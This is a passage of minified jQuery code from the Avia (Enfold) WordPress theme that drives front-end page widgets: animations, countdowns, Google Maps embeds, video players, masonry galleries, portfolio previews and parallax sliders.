


//!function(i){"use strict";function t(t){i.fn.avia_waypoints&&(void 0===t&&(t="body"),i(".avia_animate_when_visible",t).avia_waypoints(),i(".avia_animate_when_almost_visible",t).avia_waypoints({offset:"80%"}),"body"==t&&(t=".avia_desktop body"),i(".av-animated-generic",t).avia_waypoints({offset:"95%"}))}function e(e){void 0===e&&(e="body"),i.fn.avia_ajax_form&&i(".avia_ajax_form:not( .avia-disable-default-ajax )",e).avia_ajax_form(),t(e),i.fn.aviaVideoApi&&i('.avia-slideshow iframe[src*="youtube.com"], .av_youtube_frame, .avia-slideshow iframe[src*="vimeo.com"], .avia-slideshow video').aviaVideoApi({},"li"),i.fn.avia_sc_toggle&&i(".togglecontainer",e).avia_sc_toggle(),i.fn.avia_sc_tabs&&(i(".top_tab",e).avia_sc_tabs(),i(".sidebar_tab",e).avia_sc_tabs({sidebar:!0})),i.fn.avia_sc_gallery&&i(".avia-gallery",e).avia_sc_gallery(),i.fn.avia_sc_animated_number&&i(".avia-animated-number",e).avia_sc_animated_number(),i.fn.avia_sc_animation_delayed&&(i(".av_font_icon",e).avia_sc_animation_delayed({delay:100}),i(".avia-image-container",e).avia_sc_animation_delayed({delay:100}),i(".av-hotspot-image-container",e).avia_sc_animation_delayed({delay:100}),i(".av-animated-generic",e).avia_sc_animation_delayed({delay:100})),i.fn.avia_sc_iconlist&&i(".avia-icon-list.av-iconlist-big",e).avia_sc_iconlist(),i.fn.avia_sc_progressbar&&i(".avia-progress-bar-container",e).avia_sc_progressbar(),i.fn.avia_sc_testimonial&&i(".avia-testimonial-wrapper",e).avia_sc_testimonial(),i(".avia-slideshow.av_fullscreen",e).aviaFullscreenSlider(),i(".avia-slideshow:not(.av_fullscreen)",e).aviaSlider(),i(".avia-content-slider-active",e).aviaSlider({wrapElement:".avia-content-slider-inner",slideElement:".slide-entry-wrap",fullfade:!0}),i(".avia-slider-testimonials",e).aviaSlider({wrapElement:".avia-testimonial-row",slideElement:".avia-testimonial",fullfade:!0}),i.fn.aviaMaps&&i(".avia-google-map-container",e).aviaMaps(),i.fn.aviaMagazine&&i(".av-magazine-tabs-active",e).aviaMagazine(),i.fn.aviaHotspots&&i(".av-hotspot-image-container",e).aviaHotspots(),i.fn.aviaCountdown&&i(".av-countdown-timer",e).aviaCountdown()}i(document).ready(function(){i.avia_utilities=i.avia_utilities||{},/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&"ontouchstart"in document.documentElement?i.avia_utilities.isMobile=!0:i.avia_utilities.isMobile=!1,i.fn.avia_mobile_fixed&&i(".avia-bg-style-fixed").avia_mobile_fixed(),i.fn.avia_parallax&&i(".av-parallax").avia_parallax(),i.fn.avia_browser_height&&i(".av-minimum-height, .avia-fullscreen-slider, .av-cell-min-height").avia_browser_height(),i.fn.avia_video_section&&i(".av-section-with-video-bg").avia_video_section(),new i.AviaTooltip({class:"avia-tooltip",data:"avia-tooltip",delay:0,scope:"body"}),new i.AviaTooltip({class:"avia-tooltip avia-icon-tooltip",data:"avia-icon-tooltip",delay:0,scope:"body"}),e(),i(".avia-layerslider").layer_slider_height_helper(),i(".grid-links-ajax").avia_portfolio_preview(),i.fn.avia_masonry&&i(".av-masonry").avia_masonry(),i.fn.aviaccordion&&i(".aviaccordion").aviaccordion(),i.fn.avia_textrotator&&i(".av-rotator-container").avia_textrotator(),i.fn.avia_sc_tab_section&&i(".av-tab-section-container").avia_sc_tab_section(),i.fn.avia_hor_gallery&&i(".av-horizontal-gallery").avia_hor_gallery(),i.fn.avia_delayed_animation_in_container&&i(".av-animation-delay-container").avia_delayed_animation_in_container()}),function(i){var t=["weeks","days","hours","minutes","seconds"],e=function(t){var e=new Date,a=t.end-e;if(a<=0)clearInterval(t.countdown);else{switch(t.time.weeks=Math.floor(a/6048e5),t.time.days=Math.floor(a%6048e5/864e5),t.time.hours=Math.floor(a%864e5/36e5),t.time.minutes=Math.floor(a%36e5/6e4),t.time.seconds=Math.floor(a%6e4/1e3),t.data.maximum){case 1:t.time.seconds=Math.floor(a/1e3);break;case 2:t.time.minutes=Math.floor(a/6e4);break;case 3:t.time.hours=Math.floor(a/36e5);break;case 4:t.time.days=Math.floor(a/864e5)}for(var n in t.time)if("object"==typeof t.update[n]&&(t.firstrun||t.oldtime[n]!=t.time[n])){var s=1===t.time[n]?"single":"multi";t.update[n].time_container.text(t.time[n]),t.update[n].label_container.text(t.update[n][s])}t.firstrun&&t.container.addClass("av-countdown-active"),t.oldtime=i.extend({},t.time),t.firstrun=!1}};i.fn.aviaCountdown=function(a){if(this.length)return this.each(function(){var a={};a.update={},a.time={},a.oldtime={},a.firstrun=!0,a.container=i(this),a.data=a.container.data(),a.end=new Date(a.data.year,a.data.month,a.data.day,a.data.hour,a.data.minute);for(var n in t)a.update[t[n]]={time_container:a.container.find(".av-countdown-"+t[n]+" .av-countdown-time"),label_container:a.container.find(".av-countdown-"+t[n]+" .av-countdown-time-label")},a.update[t[n]].label_container.length&&(a.update[t[n]].single=a.update[t[n]].label_container.data("label"),a.update[t[n]].multi=a.update[t[n]].label_container.data("label-multi"));e(a),a.countdown=setInterval(function(){e(a)},1e3)})}}(jQuery),function(i){i.fn.aviaHotspots=function(t){if(this.length)return this.each(function(){var t={};t.container=i(this),t.hotspots=t.container.find(".av-image-hotspot"),t.container.on("avia_start_animation",function(){setTimeout(function(){t.hotspots.each(function(t){var e=i(this);setTimeout(function(){e.addClass("av-display-hotspot")},300*t)})},400)})})}}(jQuery),function(i){var t=!1,e={switchMag:function(e,a){var n=i(e);if(!n.is(".active_sort")&&!t){var s=n.data("filter"),o=a.container.filter(":visible"),r=a.container.filter("."+s);t=!0,a.sort_buttons.removeClass("active_sort"),n.addClass("active_sort"),a.magazine.height(a.magazine.outerHeight()),o.avia_animate({opacity:0},200,function(){o.css({display:"none"}),r.css({opacity:0,display:"block"}).avia_animate({opacity:1},150,function(){a.magazine.avia_animate({height:r.outerHeight()+a.sort_bar.outerHeight()},150,function(){a.magazine.height("auto"),t=!1})})})}}};i.fn.aviaMagazine=function(t){if(this.length)return this.each(function(){var t={};t.magazine=i(this),t.sort_buttons=t.magazine.find(".av-magazine-sort a"),t.container=t.magazine.find(".av-magazine-group"),t.sort_bar=t.magazine.find(".av-magazine-top-bar"),t.sort_buttons.on("click",function(i){i.preventDefault(),e.switchMag(this,t)})})}}(jQuery),function(i){i.AviaMapsAPI=function(t,e){void 0!==window.av_google_map?(this.container=e,this.$container=i(e),this.$body=i("body"),this.$mapid=this.$container.data("mapid")-1,this.$data=window.av_google_map[this.$mapid],this.retina=window.devicePixelRatio>1,this._init(t)):i.avia_utilities.log("Map creation stopped, var av_google_map not found")},i.AviaMapsAPI.apiFiles={loading:!1,finished:!1,src:"https://maps.googleapis.com/maps/api/js?v=3.27&callback=aviaOnGoogleMapsLoaded"},i.AviaMapsAPI.prototype={_init:function(){this._bind_execution(),this._getAPI()},_getAPI:function(){if(void 0!==window.google&&void 0!==window.google.maps||0!=i.AviaMapsAPI.apiFiles.loading)(void 0!==window.google&&void 0!==window.google.maps||0==i.AviaMapsAPI.apiFiles.loading)&&this._applyMap();else{i.AviaMapsAPI.apiFiles.loading=!0;var t=document.createElement("script");t.type="text/javascript",t.src=i.AviaMapsAPI.apiFiles.src,"undefined"!=avia_framework_globals.gmap_api&&""!=avia_framework_globals.gmap_api&&(t.src+="&key="+avia_framework_globals.gmap_api),document.body.appendChild(t)}},_bind_execution:function(){this.$body.on("av-google-maps-api-loaded",i.proxy(this._applyMap,this))},_applyMap:function(){if(void 0===this.map)if(this.$data.marker&&this.$data.marker[0]&&this.$data.marker[0].long&&this.$data.marker[0].long){var t=this,e=(!i.avia_utilities.isMobile||this.$data.mobile_drag_control,"auto"==this.$data.zoom?10:this.$data.zoom),a=!1,n=google.maps.MapTypeId.ROADMAP,s=google.maps.MapTypeControlStyle.DROPDOWN_MENU;switch(this.$data.maptype_control){case"dropdown":a=!0,s=google.maps.MapTypeControlStyle.DROPDOWN_MENU;break;case"horizontal":a=!0,s=google.maps.MapTypeControlStyle.HORIZONTAL_BAR;break;case"default":a=!0,s=google.maps.MapTypeControlStyle.DEFAULT;break;default:a=!1,s=google.maps.MapTypeControlStyle.DROPDOWN_MENU}switch(this.$data.maptype_id){case"SATELLITE":n=google.maps.MapTypeId.SATELLITE;break;case"HYBRID":n=google.maps.MapTypeId.HYBRID;break;case"TERRAIN":n=google.maps.MapTypeId.TERRAIN;break;default:n=google.maps.MapTypeId.ROADMAP}this.mapVars={mapMaker:!1,backgroundColor:"transparent",streetViewControl:!1,zoomControl:this.$data.zoom_control,gestureHandling:"cooperative",scrollwheel:!1,zoom:e,mapTypeControl:a,mapTypeControlOptions:{style:s},mapTypeId:n,center:new google.maps.LatLng(this.$data.marker[0].lat,this.$data.marker[0].long),styles:[{featureType:"poi",elementType:"labels",stylers:[{visibility:"off"}]}]},this.map=new google.maps.Map(this.container,this.mapVars),this._applyMapStyle(),"auto"==this.$data.zoom&&this._setAutoZoom(),google.maps.event.addListenerOnce(this.map,"tilesloaded",function(){t._addMarkers()})}else i.avia_utilities.log("Latitude or Longitude missing","map-error")},_setAutoZoom:function(){var i=new google.maps.LatLngBounds;for(var t in this.$data.marker)i.extend(new google.maps.LatLng(this.$data.marker[t].lat,this.$data.marker[t].long));this.map.fitBounds(i)},_applyMapStyle:function(){var i,t=[],e=[],a="";if(""!=this.$data.hue&&t.push({hue:this.$data.hue}),""!=this.$data.saturation&&t.push({saturation:this.$data.saturation}),t.length){if(e=[{featureType:"all",elementType:"all",stylers:t},{featureType:"poi",stylers:[{visibility:"off"}]}],"fill"==this.$data.saturation){var n=(a=this.$data.hue||"#242424").substring(1),s=parseInt(n,16),o=.2126*(s>>16&255)+.7152*(s>>8&255)+.0722*(s>>0&255),r=2;o>60&&(-1,r=3),o>220&&(-2,r=-2),e=[{featureType:"all",elementType:"all",stylers:[{color:a},{lightness:0}]},{featureType:"all",elementType:"labels.text.fill",stylers:[{color:a},{lightness:25*r}]},{featureType:"all",elementType:"labels.text.stroke",stylers:[{visibility:"on"},{color:a},{lightness:3}]},{featureType:"all",elementType:"labels.icon",stylers:[{visibility:"off"}]},{featureType:"administrative",elementType:"geometry.fill",stylers:[{color:a},{lightness:30}]},{featureType:"administrative",elementType:"geometry.stroke",stylers:[{color:a},{lightness:30},{weight:1.2}]},{featureType:"landscape",elementType:"geometry",stylers:[{visibility:"simplified"},{color:a},{lightness:3}]},{featureType:"poi",elementType:"geometry",stylers:[{visibility:"off"}]},{featureType:"road.highway",elementType:"geometry.fill",stylers:[{color:a},{lightness:-3}]},{featureType:"road.highway",elementType:"geometry.stroke",stylers:[{color:a},{lightness:2},{weight:.2}]},{featureType:"road.arterial",elementType:"geometry",stylers:[{color:a},{lightness:-3}]},{featureType:"road.local",elementType:"geometry",stylers:[{color:a},{lightness:-3}]},{featureType:"transit",elementType:"geometry",stylers:[{color:a},{lightness:-3}]},{featureType:"water",elementType:"geometry",stylers:[{color:a},{lightness:-20}]}]}i=new google.maps.StyledMapType(e,{name:"av_map_style"}),this.map.mapTypes.set("av_styled_map",i),this.map.setMapTypeId("av_styled_map")}},_addMarkers:function(){for(var t in this.$data.marker)!function(t,e){setTimeout(function(){var a="";if(e.$data.marker[t]&&e.$data.marker[t].long&&e.$data.marker[t].long){e.$data.LatLng=new google.maps.LatLng(e.$data.marker[t].lat,e.$data.marker[t].long);var n={flat:!1,position:e.$data.LatLng,animation:google.maps.Animation.BOUNCE,map:e.map,title:e.$data.marker[t].address,optimized:!1};if(e.$data.marker[t].icon&&e.$data.marker[t].imagesize){var s=e.$data.marker[t].imagesize,o="",r="";e.retina&&s>40&&(s=40),o=new google.maps.Point(s/2,s),r=new google.maps.Size(s,s),n.icon=new google.maps.MarkerImage(e.$data.marker[t].icon,null,null,o,r)}a=new google.maps.Marker(n),setTimeout(function(){a.setAnimation(null),e._infoWindow(e.map,a,e.$data.marker[t])},500)}else i.avia_utilities.log("Latitude or Longitude for single marker missing","map-error")},200*(parseInt(t,10)+1))}(t,this)},_infoWindow:function(t,e,a){var n=i.trim(a.content);if(""!=n){var s=new google.maps.InfoWindow({content:n});google.maps.event.addListener(e,"click",function(){s.open(t,e)}),a.tooltip_display&&s.open(t,e)}}},i.fn.aviaMaps=function(t){return this.each(function(){var e=i.data(this,"aviaMapsApi");e||(e=i.data(this,"aviaMapsApi",new i.AviaMapsAPI(t,this)))})}}(jQuery),window.aviaOnGoogleMapsLoaded=function(){i("body").trigger("av-google-maps-api-loaded"),i.AviaMapsAPI.apiFiles.finished=!0},function(i){i.AviaVideoAPI=function(t,e,a){this.$video=i(e),this.$option_container=a?i(a):this.$video,this.isMobile=i.avia_utilities.isMobile,this.fallback=!!this.isMobile&&this.$option_container.is(".av-mobile-fallback-image"),this.fallback||this._init(t)},i.AviaVideoAPI.defaults={loop:!1,mute:!1,controls:!1,events:"play pause mute unmute loop toggle reset unload"},i.AviaVideoAPI.apiFiles={youtube:{loaded:!1,src:"https://www.youtube.com/iframe_api"}},i.AviaVideoAPI.prototype={_init:function(t){this.options=this._setOptions(t),this.type=this._getPlayerType(),this._setPlayer(),this.eventsBound=!1,this.playing=!1,this.$option_container.addClass("av-video-paused"),this.pp=i.avia_utilities.playpause(this.$option_container)},_setOptions:function(t){var e=i.extend(!0,{},i.AviaVideoAPI.defaults,t),a=this.$option_container.data(),n="";for(n in a)!a.hasOwnProperty(n)||"string"!=typeof a[n]&&"number"!=typeof a[n]&&"boolean"!=typeof a[n]||(e[n]=a[n]);return e},_getPlayerType:function(){var i=this.$video.get(0).src||this.$video.data("src");return this.$video.is("video")?"html5":this.$video.is(".av_youtube_frame")?"youtube":-1!=i.indexOf("vimeo.com")?"vimeo":-1!=i.indexOf("youtube.com")?"youtube":void 0},_setPlayer:function(){var t=this;switch(this.type){case"html5":this.player=this.$video.data("mediaelementplayer"),this._playerReady();break;case"vimeo":this.player=Froogaloop(this.$video.get(0)),this._playerReady();break;case"youtube":this._getAPI(this.type),i("body").on("av-youtube-iframe-api-loaded",function(){t._playerReady()})}},_getAPI:function(t){if(!1===i.AviaVideoAPI.apiFiles[t].loaded){i.AviaVideoAPI.apiFiles[t].loaded=!0;var e=document.createElement("script"),a=document.getElementsByTagName("script")[0];e.src=i.AviaVideoAPI.apiFiles[t].src,a.parentNode.insertBefore(e,a)}},_playerReady:function(){var t=this;switch(this.$option_container.on("av-video-loaded",function(){t._bindEvents()}),this.type){case"html5":this.$video.on("av-mediajs-loaded",function(){t.$option_container.trigger("av-video-loaded")}),this.$video.on("av-mediajs-ended",function(){t.$option_container.trigger("av-video-ended")});break;case"vimeo":t.player.addEvent("ready",function(){t.$option_container.trigger("av-video-loaded"),t.player.addEvent("finish",function(){t.$option_container.trigger("av-video-ended")})});break;case"youtube":var e=t.$video.data();t._supports_video()&&(e.html5=1),t.player=new YT.Player(t.$video.attr("id"),{videoId:e.videoid,height:t.$video.attr("height"),width:t.$video.attr("width"),playerVars:e,events:{onReady:function(){t.$option_container.trigger("av-video-loaded")},onError:function(t){i.avia_utilities.log("YOUTUBE ERROR:","error",t)},onStateChange:function(i){if(i.data===YT.PlayerState.ENDED){var e=0!=t.options.loop?"loop":"av-video-ended";t.$option_container.trigger(e)}}}})}setTimeout(function(){1!=t.eventsBound&&void 0!==t.eventsBound&&"youtube"!=t.type&&(i.avia_utilities.log('Fallback Video Trigger "'+t.type+'":',"log",t),t.$option_container.trigger("av-video-loaded"))},2e3)},_bindEvents:function(){if(1!=this.eventsBound&&void 0!==this.eventsBound){var i=this,t="unmute";this.eventsBound=!0,this.$option_container.on(this.options.events,function(t){i.api(t.type)}),i.isMobile||(0!=this.options.mute&&(t="mute"),0!=this.options.loop&&i.api("loop"),i.api(t)),setTimeout(function(){i.$option_container.trigger("av-video-events-bound").addClass("av-video-events-bound")},50)}},_supports_video:function(){return!!document.createElement("video").canPlayType},api:function(i){this.isMobile&&!this.was_started()||-1!==this.options.events.indexOf(i)&&(this.$option_container.trigger("av-video-"+i+"-executed"),"function"==typeof this["_"+this.type+"_"+i]&&this["_"+this.type+"_"+i].call(this),"function"==typeof this["_"+i]&&this["_"+i].call(this))},was_started:function(){if(!this.player)return!1;switch(this.type){case"html5":if(this.player.getCurrentTime()>0)return!0;break;case"vimeo":if(this.player.api("getCurrentTime")>0)return!0;break;case"youtube":if(-1!==this.player.getPlayerState())return!0}return!1},_play:function(){this.playing=!0,this.$option_container.addClass("av-video-playing").removeClass("av-video-paused")},_pause:function(){this.playing=!1,this.$option_container.removeClass("av-video-playing").addClass("av-video-paused")},_loop:function(){this.options.loop=!0},_toggle:function(){var i=1==this.playing?"pause":"play";this.api(i),this.pp.set(i)},_vimeo_play:function(){this.player.api("play")},_vimeo_pause:function(){this.player.api("pause")},_vimeo_mute:function(){this.player.api("setVolume",0)},_vimeo_unmute:function(){this.player.api("setVolume",.7)},_vimeo_loop:function(){},_vimeo_reset:function(){this.player.api("seekTo",0)},_vimeo_unload:function(){this.player.api("unload")},_youtube_play:function(){this.player.playVideo()},_youtube_pause:function(){this.player.pauseVideo()},_youtube_mute:function(){this.player.mute()},_youtube_unmute:function(){this.player.unMute()},_youtube_loop:function(){1==this.playing&&this.player.seekTo(0)},_youtube_reset:function(){this.player.stopVideo()},_youtube_unload:function(){this.player.clearVideo()},_html5_play:function(){this.player.options.pauseOtherPlayers=!1,this.player.play()},_html5_pause:function(){this.player.pause()},_html5_mute:function(){this.player.setMuted(!0)},_html5_unmute:function(){this.player.setVolume(.7)},_html5_loop:function(){this.player.options.loop=!0},_html5_reset:function(){this.player.setCurrentTime(0)},_html5_unload:function(){this._html5_pause(),this._html5_reset()}},i.fn.aviaVideoApi=function(t,e){return this.each(function(){var a=this;e&&(a=i(this).parents(e).get(0));var n=i.data(a,"aviaVideoApi");n||(n=i.data(a,"aviaVideoApi",new i.AviaVideoAPI(t,this,a)))})}}(jQuery),window.onYouTubeIframeAPIReady=function(){i("body").trigger("av-youtube-iframe-api-loaded")},i.fn.avia_masonry=function(t){if(!this.length)return this;var e=i("body"),a=i(window),n=i.avia_utilities.isMobile,s=!1,o={masonry_filter:function(){var t=i(this),e=t.html(),a=t.data("filter"),n=t.parents(".av-masonry:eq(0)"),s=n.find(".av-masonry-container:eq(0)"),r=n.find(".av-masonry-sort a"),l=n.find(".av-current-sort-title");return r.removeClass("active_sort"),t.addClass("active_sort"),s.attr("id","masonry_id_"+a),l.length&&l.html(e),o.applyMasonry(s,a,function(){s.css({overflow:"visible"})}),!1},applyMasonry:function(i,t,e){var n=t?{filter:"."+t}:{};n.layoutMode="packery",n.packery={gutter:0},n.percentPosition=!0,n.itemSelector="a.isotope-item, div.isotope-item",i.isotope(n,function(){a.trigger("av-height-change")}),"function"==typeof e&&setTimeout(e,0)},show_bricks:function(t,e){t.each(function(s){var o=i(this),r=i.avia_utilities.supports("transition"),l=n?0:100;setTimeout(function(){!1===r?o.css({visibility:"visible",opacity:0}).animate({opacity:1},1500):o.addClass("av-masonry-item-loaded"),s==t.length-1&&"function"==typeof e&&(e.call(),a.trigger("av-height-change"))},l*s)})},loadMore:function(t){if(t.preventDefault(),s)return!1;s=!0;var n=i(this),r=n.data(),l=n.parents(".av-masonry:eq(0)"),c=l.find(".av-masonry-container"),d=l.find(".av-masonry-entry"),h=i.avia_utilities.loading(),u=function(){s=!1,h.hide(),e.trigger("av_resize_finished")};r.offset||(r.offset=0),r.offset+=r.items,r.action="avia_ajax_masonry_more",r.loaded=[],d.each(function(){var t=i(this).data("av-masonry-item");t&&r.loaded.push(t)}),i.ajax({url:avia_framework_globals.ajaxurl,type:"POST",data:r,beforeSend:function(){h.show()},success:function(t){if(-1!==t.indexOf("{av-masonry-loaded}")){var t=t.split("{av-masonry-loaded}"),e=i(t.pop()).filter(".isotope-item");e.length>r.items?e=e.not(":last"):n.addClass("av-masonry-no-more-items");var s=i('<div class="loadcontainer"></div>').append(e);i.avia_utilities.preload({container:s,single_callback:function(){var t=l.find(".av-masonry-sort a"),n=l.find(".av-sort-by-term"),s=n.data("av-allowed-sort");n.hide(),h.hide(),c.isotope("insert",e),i.avia_utilities.avia_ajax_call(l),setTimeout(function(){o.show_bricks(e,u)},150),setTimeout(function(){a.trigger("av-height-change")},550),t&&i(t).each(function(t){var a=i(this),n=a.data("filter");e&&i(e).each(function(t){if(i(this).hasClass(n)&&-1!==s.indexOf(n)){var e=a.find(".avia-term-count").text();a.find(".avia-term-count").text(" "+(parseInt(e)+1)+" "),a.hasClass("avia_hide_sort")&&(a.removeClass("avia_hide_sort").addClass("avia_show_sort"),l.find(".av-masonry-sort ."+n+"_sep").removeClass("avia_hide_sort").addClass("avia_show_sort"),l.find(".av-masonry-sort .av-sort-by-term").removeClass("hidden"))}})}),n.fadeIn()}})}else u()},error:u,complete:function(){}})}};return this.each(function(){var t=i(this),e=t.find(".av-masonry-container"),a=t.find(".isotope-item"),s=t.find(".av-masonry-sort").css({visibility:"visible",opacity:0}).on("click","a",o.masonry_filter),r=t.find(".av-masonry-load-more").css({visibility:"visible",opacity:0});i.avia_utilities.preload({container:e,single_callback:function(){var l=function(){s.animate({opacity:1},400),e.outerHeight()+e.offset().top+i("#footer").outerHeight()>i(window).height()&&i("html").css({"overflow-y":"scroll"}),o.applyMasonry(e,!1,function(){t.addClass("avia_sortable_active"),e.removeClass("av-js-disabled ")}),o.show_bricks(a,function(){r.css({opacity:1}).on("click",o.loadMore)})};n?l():t.waypoint(l,{offset:"80%"}),i(window).on("debouncedresize",function(){o.applyMasonry(e,!1,function(){t.addClass("avia_sortable_active")})})}})})},function(i){i.avia_utilities=i.avia_utilities||{},i.fn.avia_portfolio_preview=function(t){var a=i(window),n=i("body"),s=(i.avia_utilities.isMobile,{open_in:".portfolio-details-inner",easing:"easeOutQuint",timing:800,transition:"slide"}),o=i.extend({},s,t);return this.each(function(){var t,s,r=i(this),l=r.data("portfolio-id"),c=i('.portfolio_preview_container[data-portfolio-id="'+l+'"]'),d=c.find(o.open_in),h=r.find(".grid-entry"),u={},v=!1,p=!1,f=!1,_=!1,m=i.avia_utilities.loading();(t={load_item:function(e){e.preventDefault();var a=i(this).parents(".post-entry:eq(0)"),n="ID_"+a.data("ajax-id"),s=h.index(a);if(n===v||1==p)return!1;p=!0,r.find(".active_portfolio_item").removeClass("active_portfolio_item"),a.addClass("active_portfolio_item"),m.show(),t.ajax_get_contents(n,s)},scroll_top:function(){setTimeout(function(){var t=c.offset().top-175,e=a.scrollTop();(e>t||t-e>100)&&i("html:not(:animated),body:not(:animated)").animate({scrollTop:t},o.timing,o.easing)},10)},attach_item:function(t){u[t]=i(u[t]).appendTo(d),_=!0},remove_video:function(){var i=c.find("iframe, .avia-video").parents(".ajax_slide:not(.open_slide)");i.length>0&&(i.remove(),u["ID_"+i.data("slideId")]=void 0)},show_item:function(a,s){if(a===v)return!1;if(p=!0,m.hide(),!1===v)c.addClass("open_container"),u[a].addClass("open_slide"),t.scroll_top(),c.css({display:"none"}).slideDown(o.timing,o.easing,function(){_&&(e(u[a]),i.avia_utilities.avia_ajax_call(u[a]),n.trigger("av_resize_finished"),_=!1),t.remove_video(),n.trigger("av_resize_finished")}),f=s,v=a,p=!1;else{t.scroll_top();var r={zIndex:3},l=o.easing;f>s&&(r.left="-110%"),"fade"===o.transition&&(r.left="0%",r.opacity=0,l="easeOutQuad"),d.height(d.height()),u[a].css(r).avia_animate({left:"0%",opacity:1},o.timing,l),u[v].avia_animate({opacity:0},o.timing,l,function(){u[v].attr({style:""}).removeClass("open_slide"),u[a].addClass("open_slide"),d.avia_animate({height:u[a].outerHeight()+2},o.timing/2,o.easing,function(){d.attr({style:""}),v=a,f=s,p=!1,t.remove_video(),_&&(n.trigger("av_resize_finished"),e(u[a]),i.avia_utilities.avia_ajax_call(u[a]),_=!1)})})}},ajax_get_contents:function(e,a){void 0===u[e]?(u[e]=i("#avia-tmpl-portfolio-preview-"+e.replace(/ID_/,"")).html(),u[e]=u[e].replace("/*<![CDATA[*/","").replace("*]]>",""),t.attach_item(e),i.avia_utilities.preload({container:u[e],single_callback:function(){t.show_item(e,a)}})):t.show_item(e,a)},add_controls:function(){s=c.find(".ajax_controlls"),c.avia_keyboard_controls({27:".avia_close",37:".ajax_previous",39:".ajax_next"}),h.each(function(){var e,a=i(this);a.addClass("no_combo").bind("click",function(i){if((e=a.find(".slideshow_overlay")).length)return i.stopPropagation(),t.load_item.apply(a.find("a:eq(0)")),!1})})},control_click:function(){var e,a=r.find(".active_portfolio_item").data("ajax-id"),s=r.find(".post-entry-"+a);switch(this.hash){case"#next":(e=s.nextAll(".post-entry:visible:eq(0)").find("a:eq(0)")).length||(e=i(".post-entry:visible:eq(0)",r).find("a:eq(0)")),e.trigger("click");break;case"#prev":(e=s.prevAll(".post-entry:visible:eq(0)").find("a:eq(0)")).length||(e=i(".post-entry:visible:last",r).find("a:eq(0)")),e.trigger("click");break;case"#close":p=!0,c.slideUp(o.timing,o.easing,function(){r.find(".active_portfolio_item").removeClass("active_portfolio_item"),u[v].attr({style:""}).removeClass("open_slide"),c.removeClass("open_container"),p=v=f=!1,t.remove_video(),n.trigger("av_resize_finished")})}return!1},resize_reset:function(){!1===v&&(d.html(""),u=[])}}).add_controls(),r.on("click","a",t.load_item),s.on("click","a",t.control_click),jQuery.support.leadingWhitespace&&a.bind("debouncedresize",t.resize_reset)})}}(jQuery),i.AviaFullscreenSlider=function(t,e){this.$slider=i(e),this.$inner=this.$slider.find(".avia-slideshow-inner"),this.$innerLi=this.$inner.find(">li"),this.$caption=this.$inner.find(".avia-slide-wrap .caption_container"),this.$win=i(window),this.isMobile=i.avia_utilities.isMobile,this.property={},this.scrollPos="0",this.transform3d=-1!==document.documentElement.className.indexOf("avia_transform3d"),this.ticking=!1,void 0===i.avia_utilities.supported.transition&&(i.avia_utilities.supported.transition=i.avia_utilities.supports("transition")),this._init(t)},i.AviaFullscreenSlider.defaults={height:100,subtract:"#wpadminbar, #header, #main>.title_container"},i.AviaFullscreenSlider.prototype={_init:function(t){var e=this;this.options=i.extend(!0,{},i.AviaFullscreenSlider.defaults,t),this.$slider.data("slide_height")&&(this.options.height=this.$slider.data("slide_height")),this.options.parallax_enabled=""==this.$slider.data("image_attachment"),this.$subtract=i(this.options.subtract),this._setSize(),this.$win.on("debouncedresize",i.proxy(this._setSize,this)),setTimeout(function(){!e.isMobile&&e.options.parallax_enabled&&e.$win.on("scroll",i.proxy(e._on_scroll,e))},100),this.$slider.aviaSlider({bg_slider:!0})},_on_scroll:function(t){var e=this;e.ticking||(e.ticking=!0,window.requestAnimationFrame(i.proxy(e._parallax_scroll,e)))},_fetch_properties:function(i){this.property.offset=this.$slider.offset().top,this.property.wh=this.$win.height(),this.property.height=i||this.$slider.outerHeight(),this._parallax_scroll()},_setSize:function(){if(!i.fn.avia_browser_height){var t=this.$win.height(),e=Math.ceil(t/100*this.options.height);this.$subtract.length&&100==this.options.height?this.$subtract.each(function(){e-=this.offsetHeight-.5}):e-=1,this.$slider.height(e).removeClass("av-default-height-applied"),this.$inner.css("padding",0)}this._fetch_properties(e)},_parallax_scroll:function(t){if(!this.isMobile&&this.options.parallax_enabled){var e=this.$win.scrollTop(),a=(this.property.wh,"0"),n={};this.property.offset<e&&e<=this.property.offset+this.property.height&&(a=Math.round(.3*(e-this.property.offset))),this.scrollPos!=a&&(this.scrollPos=a,this.transform3d?n[i.avia_utilities.supported.transition+"transform"]="translate3d(0px,"+a+"px,0px)":n[i.avia_utilities.supported.transition+"transform"]="translate(0px,"+a+"px)",this.$inner.css(n)),this.ticking=!1}}},i.fn.aviaFullscreenSlider=function(t){return this.each(function(){i.data(this,"aviaFullscreenSlider")||(i.data(this,"aviaFullscreenSlider",1),new i.AviaFullscreenSlider(t,this))})},i.AviaParallaxElement=function(t,e){this.$el=i(e).addClass("active-parallax"),this.$win=i(window),this.$body=i("body"),this.$parent=this.$el.parent(),this.property={},this.isMobile=i.avia_utilities.isMobile,this.ratio=this.$el.data("avia-parallax-ratio")||.5,this.transform=-1!==document.documentElement.className.indexOf("avia_transform"),this.transform3d=-1!==document.documentElement.className.indexOf("avia_transform3d"),this.ticking=!1,void 0===i.avia_utilities.supported.transition&&(i.avia_utilities.supported.transition=i.avia_utilities.supports("transition")),this._init(t)},i.AviaParallaxElement.prototype={_init:function(t){var e=this;e.isMobile||(setTimeout(function(){e._fetch_properties()},30),this.$win.on("debouncedresize av-height-change",i.proxy(e._fetch_properties,e)),this.$body.on("av_resize_finished",i.proxy(e._fetch_properties,e)),setTimeout(function(){e.$win.on("scroll",i.proxy(e._on_scroll,e))},100))},_fetch_properties:function(){this.property.offset=this.$parent.offset().top,this.property.wh=this.$win.height(),this.property.height=this.$parent.outerHeight(),this.$el.height(Math.ceil(this.property.wh*this.ratio+this.property.height)),this._parallax_scroll()},_on_scroll:function(t){var e=this;e.ticking||(e.ticking=!0,window.requestAnimationFrame(i.proxy(e._parallax_scroll,e)))},_parallax_scroll:function(t){var e=this.$win.scrollTop(),a=e+this.property.wh,n="0",s={};this.property.offset<a&&e<=this.property.offset+this.property.height&&(n=Math.ceil((a-this.property.offset)*this.ratio),this.transform3d?s[i.avia_utilities.supported.transition+"transform"]="translate3d(0px,"+n+"px, 0px)":this.transform?s[i.avia_utilities.supported.transition+"transform"]="translate(0px,"+n+"px)":s["background-position"]="0px "+n+"px",this.$el.css(s)),this.ticking=!1}},i.fn.avia_parallax=function(t){return this.each(function(){var e=i.data(this,"aviaParallax");e||(e=i.data(this,"aviaParallax",new i.AviaParallaxElement(t,this)))})},i.fn.avia_mobile_fixed=function(t){if(i.avia_utilities.isMobile)return this.each(function(){var 